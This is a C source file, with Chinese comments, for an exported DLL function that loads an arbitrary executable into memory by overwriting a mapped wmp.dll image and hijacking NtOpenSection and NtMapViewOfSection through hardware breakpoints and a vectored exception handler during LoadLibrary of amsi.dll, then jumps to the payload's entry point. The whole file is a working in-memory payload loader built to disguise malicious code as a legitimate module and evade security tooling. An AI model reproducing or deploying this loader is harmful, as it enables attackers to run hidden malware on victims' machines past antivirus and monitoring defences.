#include <Windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <winternl.h>

#if defined(_WIN32) && !defined(_WIN64)
#error This project must be compiled as 64-bit (x64). 32-bit build is not supported.
#endif

#define CTX_FLAGS (CONTEXT_DEBUG_REGISTERS)

// 导出宏
#ifdef __cplusplus
#define EXPORT extern "C" __declspec(dllexport)
#else
#define EXPORT __declspec(dllexport)
#endif

typedef enum _SECTION_INHERIT {
    ViewShare = 1,
    ViewUnmap = 2
} SECTION_INHERIT;

#pragma comment(lib, "ntdll.lib")

// NTAPI 声明（避免依赖头文件缺失）
EXTERN_C NTSYSAPI NTSTATUS NTAPI NtOpenSection(PHANDLE SectionHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes);
EXTERN_C NTSYSAPI NTSTATUS NTAPI NtContinue(PCONTEXT ContextRecord, BOOLEAN TestAlert);
EXTERN_C NTSYSAPI NTSTATUS NTAPI NtCreateSection(PHANDLE SectionHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL, PLARGE_INTEGER MaximumSize OPTIONAL, ULONG SectionPageProtection, ULONG AllocationAttributes, HANDLE FileHandle OPTIONAL);
EXTERN_C NTSYSAPI NTSTATUS NTAPI NtMapViewOfSection(HANDLE SectionHandle, HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, SIZE_T CommitSize, PLARGE_INTEGER SectionOffset OPTIONAL, PSIZE_T ViewSize, SECTION_INHERIT InheritDisposition, ULONG AllocationType, ULONG Win32Protect);

// 全局状态（注意：多线程不安全！仅用于单次调用）
enum LdrState {
    StateOpenSection = 0,
    StateMapViewOfSection,
    StateClose
};

static enum LdrState gLdrState = StateOpenSection;
static SIZE_T gViewSize = 0;
static PVOID gBaseAddress = NULL;
static HANDLE gSectionHandle = NULL;
static DWORD gEntrypointOffset = 0;

// --- 以下函数保持不变（略作调整）---

BOOL SetHardwareBreakpoint(const PVOID address, PCONTEXT ctx)
{
    if (ctx) {
        ctx->Dr7 = 1ULL;
        ctx->Dr0 = (DWORD64)address;
        NtContinue(ctx, FALSE);
        return TRUE;
    } else {
        CONTEXT context = { 0 };
        context.ContextFlags = CTX_FLAGS;
        HANDLE hThread = GetCurrentThread();
        if (!GetThreadContext(hThread, &context))
            return FALSE;
        context.Dr7 = 1;
        context.Dr0 = (DWORD64)address;
        return SetThreadContext(hThread, &context);
    }
}

LONG WINAPI InjectHandler(PEXCEPTION_POINTERS ExceptionInfo)
{
    if (ExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {
        CONTEXT* ctx = ExceptionInfo->ContextRecord;

        switch (gLdrState) {
        case StateOpenSection: {
            *(PHANDLE)ctx->Rcx = gSectionHandle;
            ctx->Rax = 0;
            BYTE* rip = (BYTE*)ctx->Rip;
            while (*rip != 0xC3) ++rip;
            ctx->Rip = (ULONG_PTR)rip;

            gLdrState = StateMapViewOfSection;
            SetHardwareBreakpoint((PVOID)NtMapViewOfSection, ctx);
            NtContinue(ctx, FALSE);
            return EXCEPTION_CONTINUE_EXECUTION;
        }

        case StateMapViewOfSection: {
            if ((HANDLE)ctx->Rcx != gSectionHandle)
                return EXCEPTION_CONTINUE_EXECUTION;

            PVOID* baseAddrPtr = (PVOID*)ctx->R8;
            PSIZE_T viewSizePtr = *(PSIZE_T*)(ctx->Rsp + 0x38);
            ULONG* allocTypePtr = (ULONG*)(ctx->Rsp + 0x48);
            ULONG* protectPtr = (ULONG*)(ctx->Rsp + 0x50);

            if (baseAddrPtr) *baseAddrPtr = gBaseAddress;
            if (viewSizePtr) *viewSizePtr = gViewSize;
            if (allocTypePtr) *allocTypePtr = 0;
            if (protectPtr) *protectPtr = PAGE_EXECUTE_READWRITE;

            ctx->Rax = 0;
            BYTE* rip = (BYTE*)ctx->Rip;
            while (*rip != 0xC3) ++rip;
            ctx->Rip = (ULONG_PTR)rip;

            // 清除断点
            ctx->Dr0 = ctx->Dr1 = ctx->Dr2 = ctx->Dr3 = 0;
            ctx->Dr6 = ctx->Dr7 = 0;
            ctx->EFlags |= 0x10000u; // TF=1，继续单步？这里其实可以关掉

            NtContinue(ctx, FALSE);
            return EXCEPTION_CONTINUE_EXECUTION;
        }
        }
    }
    return EXCEPTION_CONTINUE_SEARCH;
}

BOOL ApplyRelocations(PBYTE base, SIZE_T imageSize, ULONGLONG newBase, ULONGLONG oldBase)
{
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(base + dos->e_lfanew);
    ULONGLONG delta = newBase - nt->OptionalHeader.ImageBase;
    if (!delta) return TRUE;

    IMAGE_DATA_DIRECTORY relocDir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    if (!relocDir.VirtualAddress || !relocDir.Size) return TRUE;

    SIZE_T processed = 0;
    PIMAGE_BASE_RELOCATION block = (PIMAGE_BASE_RELOCATION)(base + relocDir.VirtualAddress);
    while (processed < relocDir.Size && block->SizeOfBlock) {
        DWORD count = (block->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
        WORD* entry = (WORD*)((PBYTE)block + sizeof(IMAGE_BASE_RELOCATION));
        for (DWORD i = 0; i < count; i++, entry++) {
            WORD type = *entry >> 12;
            WORD offset = *entry & 0xFFF;
            BYTE* patchAddr = base + block->VirtualAddress + offset;
            if (type == IMAGE_REL_BASED_HIGHLOW)
                *(DWORD*)patchAddr += (DWORD)delta;
            else if (type == IMAGE_REL_BASED_DIR64)
                *(ULONGLONG*)patchAddr += delta;
        }
        processed += block->SizeOfBlock;
        block = (PIMAGE_BASE_RELOCATION)((PBYTE)block + block->SizeOfBlock);
    }
    return TRUE;
}

BOOL CopyImageSections(PBYTE sourceBuffer, PVOID baseAddress, SIZE_T viewSize)
{
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)sourceBuffer;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(sourceBuffer + dos->e_lfanew);
    SIZE_T headersSize = nt->OptionalHeader.SizeOfHeaders;
    memcpy(baseAddress, sourceBuffer, headersSize);

    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
        if (sec->SizeOfRawData == 0) continue;
        BYTE* dst = (BYTE*)baseAddress + sec->VirtualAddress;
        BYTE* src = sourceBuffer + sec->PointerToRawData;
        SIZE_T size = sec->SizeOfRawData;
        if (sec->VirtualAddress + size > viewSize)
            size = viewSize - sec->VirtualAddress;
        memcpy(dst, src, size);
    }
    return TRUE;
}

BOOL ApplySectionProtections(PVOID baseAddress)
{
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)baseAddress;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)baseAddress + dos->e_lfanew);
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
        DWORD protect;
        if (sec->Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            protect = (sec->Characteristics & IMAGE_SCN_MEM_WRITE) ? PAGE_EXECUTE_READWRITE :
                    (sec->Characteristics & IMAGE_SCN_MEM_READ)   ? PAGE_EXECUTE_READ : PAGE_EXECUTE;
        } else {
            protect = (sec->Characteristics & IMAGE_SCN_MEM_WRITE) ? PAGE_READWRITE :
                    (sec->Characteristics & IMAGE_SCN_MEM_READ)   ? PAGE_READONLY : PAGE_NOACCESS;
        }
        SIZE_T size = sec->Misc.VirtualSize ? sec->Misc.VirtualSize : sec->SizeOfRawData;
        VirtualProtect((BYTE*)baseAddress + sec->VirtualAddress, size, protect, &(DWORD){0});
    }
    return TRUE;
}

// ========================
// 导出函数：核心逻辑
// ========================
EXPORT BOOL load_vectoredoverload(LPCWSTR exePath)
{
    // 默认路径
    LPCWSTR targetPath = exePath ? exePath : L"C:\\Windows\\System32\\calc.exe";

    // 打开目标 EXE
    HANDLE hFile = CreateFileW(targetPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        return FALSE;
    }

    DWORD fileSize = GetFileSize(hFile, NULL);
    BYTE* pPeBuf = (BYTE*)HeapAlloc(GetProcessHeap(), 0, fileSize);
    if (!pPeBuf) {
        CloseHandle(hFile);
        return FALSE;
    }

    DWORD bytesRead;
    ReadFile(hFile, pPeBuf, fileSize, &bytesRead, NULL);
    CloseHandle(hFile);

    // 解析 PE
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)pPeBuf;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(pPeBuf + dos->e_lfanew);
    gEntrypointOffset = nt->OptionalHeader.AddressOfEntryPoint;

    // 强制标记为 DLL（欺骗 loader）
    if (!(nt->FileHeader.Characteristics & IMAGE_FILE_DLL)) {
        nt->FileHeader.Characteristics |= IMAGE_FILE_DLL;
        nt->OptionalHeader.AddressOfEntryPoint = 0;
    }

    // 打开 wmp.dll 作为 section 模板
    HANDLE hWmp = CreateFileW(L"C:\\Windows\\System32\\wmp.dll", GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hWmp == INVALID_HANDLE_VALUE) {
        HeapFree(GetProcessHeap(), 0, pPeBuf);
        return FALSE;
    }

    NTSTATUS status = NtCreateSection(&gSectionHandle, SECTION_ALL_ACCESS, NULL, NULL, PAGE_READONLY, SEC_IMAGE, hWmp);
    CloseHandle(hWmp);
    if (status < 0) {
        HeapFree(GetProcessHeap(), 0, pPeBuf);
        return FALSE;
    }

    status = NtMapViewOfSection(gSectionHandle, GetCurrentProcess(), &gBaseAddress, 0, 0, NULL, &gViewSize, ViewShare, 0, PAGE_READWRITE);
    if (status < 0) {
        NtClose(gSectionHandle);
        HeapFree(GetProcessHeap(), 0, pPeBuf);
        return FALSE;
    }

    // 清空映射内存，填入我们的 payload
    DWORD oldProt;
    VirtualProtect(gBaseAddress, nt->OptionalHeader.SizeOfImage, PAGE_READWRITE, &oldProt);
    memset(gBaseAddress, 0, nt->OptionalHeader.SizeOfImage);

    CopyImageSections(pPeBuf, gBaseAddress, gViewSize);
    HeapFree(GetProcessHeap(), 0, pPeBuf);

    ApplyRelocations((PBYTE)gBaseAddress, nt->OptionalHeader.SizeOfImage, (ULONGLONG)gBaseAddress, nt->OptionalHeader.ImageBase);
    ApplySectionProtections(gBaseAddress);

    // 安装异常处理器 + 设置断点
    PVOID handler = AddVectoredExceptionHandler(1, (PVECTORED_EXCEPTION_HANDLER)InjectHandler);
    if (!handler) {
        // 回滚资源？
        return FALSE;
    }

    SetHardwareBreakpoint((PVOID)NtOpenSection, NULL);

    // 触发加载流程
    HMODULE amsi = LoadLibraryW(L"amsi.dll");
    RemoveVectoredExceptionHandler(handler);

    if (!amsi) {
        return FALSE;
    }

    // 执行原始入口点
    PVOID entryPoint = (BYTE*)gBaseAddress + gEntrypointOffset;
    ((void(*)())entryPoint)();

    return TRUE;
}